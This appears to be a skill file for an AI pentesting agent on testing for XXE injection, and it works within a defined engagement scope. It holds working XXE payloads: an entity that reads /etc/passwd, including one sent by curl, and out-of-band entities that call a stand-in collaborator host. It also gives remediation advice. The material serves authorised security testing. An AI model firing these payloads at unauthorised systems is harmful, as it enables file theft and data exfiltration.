---
name: testing-xxe
description: Test for OWASP A03 XML External Entity injection — SOAP, XML-uploading endpoints, and XML-serialized APIs.
---

# Testing for XXE Injection (OWASP A03)

## When to use

Prerequisite skills: `methodology-scoping`, `methodology-rules-of-engagement`, `recon-api-enum`, `recon-content-discovery`, `mcp-burp`.

Use this skill when an endpoint accepts XML input: `Content-Type: application/xml`, `text/xml`, SOAP web services, SVG file uploads, or DOCX/XLSX import endpoints that are parsed server-side.

## Signal to look for

- XML bodies in Burp proxy history (`Content-Type: application/xml` or `text/xml`).
- SOAP WSDL endpoints exposed at `/service?wsdl`, `/api.wsdl`, or similar paths.
- File-upload endpoints that accept SVG, DOCX, or XLSX formats where the server parses the underlying XML content.

## Test steps

1. Identify XML-accepting endpoints via `burp_proxy_history(contains="application/xml")` and review the Burp sitemap for SOAP WSDL paths.
2. Probe the target endpoint with a classic entity payload:
   ```
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
   ```
3. Confirm the response contains file contents (e.g., `root:x:0:0:` lines from `/etc/passwd`).
4. For blind XXE (no in-band reflection), use an out-of-band payload with Burp Collaborator (Pro) or interactsh:
   ```
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<collab>/x"> %xxe;]><root/>
   ```
   Monitor the collaborator or interactsh dashboard for DNS or HTTP callbacks.
5. Capture all evidence per `methodology-evidence-capture` before moving on.

## Tool commands

**Shell — in-band probe:**

```bash
curl -X POST \
  -H 'Content-Type: application/xml' \
  --data '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' \
  https://target.example.com/api/import
# Success: response body contains /etc/passwd content
```

**MCP — send via Burp Repeater:**

```
burp_repeater_send(
  raw_base64=<b64_of_full_http_request>,
  host="target.example.com",
  port=443,
  secure=true,
  tab_name="xxe-probe"
)
```

Review the response body for file contents:

```
burp_proxy_request(id=<N>)
```

## Interpret results

- **Confirmed (in-band):** Response body includes readable file contents (e.g., `/etc/passwd` lines, Windows `win.ini` content). Mark as High severity.
- **Confirmed (blind/OOB):** DNS lookup or HTTP callback received at the collaborator or interactsh host for the injected URL. Mark as High severity (OOB exfiltration).
- **Escalated severity:** Successful RCE via PHP `expect://` wrapper, or server crash / timeout indicating a Billion Laughs DoS payload — escalate to Critical.
- **False positive:** XML parser returns an error explicitly mentioning "external DTD forbidden", "DOCTYPE is disallowed", or "Entity reference loop" — the parser has DTD processing disabled and is not vulnerable. Document the error message and close the finding.

## Finding writeup

- **Title:** `XXE Injection in <endpoint>`
- **Severity:**
  - File read via `file://` — **High**
  - Out-of-band HTTP/DNS exfiltration — **High**
  - RCE via PHP `expect://` wrapper or Billion Laughs DoS — **Critical**
- **Evidence** (per `methodology-evidence-capture`):
  - Raw HTTP request containing the XXE payload (exported from Burp Repeater).
  - Raw HTTP response showing extracted file contents or collaborator callback screenshot.
  - `burp_repeater_send` call and response for tester reproducibility.
- **Recommended fix:** Disable DTD processing entirely in the XML parser (implementation varies by library — e.g., `FEATURE_SECURE_PROCESSING` in Java, `LIBXML_NOENT` removal in PHP, `XmlResolver = null` in .NET). Prefer JSON APIs where XML is not required.

## Blind detection (OOB)

When the response gives no direct signal, use the OOB receiver:

1. `oob_get_payload` → note the `domain`.
2. Embed an external entity: `<!DOCTYPE x [<!ENTITY e SYSTEM "http://<domain>/xxe">]>` and reference `&e;`.
3. Send the request.
4. `oob_poll since_id=0` — a `dns` or `http` interaction confirms the parser
   resolved the external entity.

## References

- OWASP WSTG INPV-07: <https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection>
- PortSwigger XXE: <https://portswigger.net/web-security/xxe>
- CWE-611: <https://cwe.mitre.org/data/definitions/611.html>

## Scope

This skill operates within the engagement scope established by
`methodology-scoping` and `methodology-rules-of-engagement`. Targets are
constrained mechanically via `burp_scope_check`; hosts outside Burp scope are
not tested.
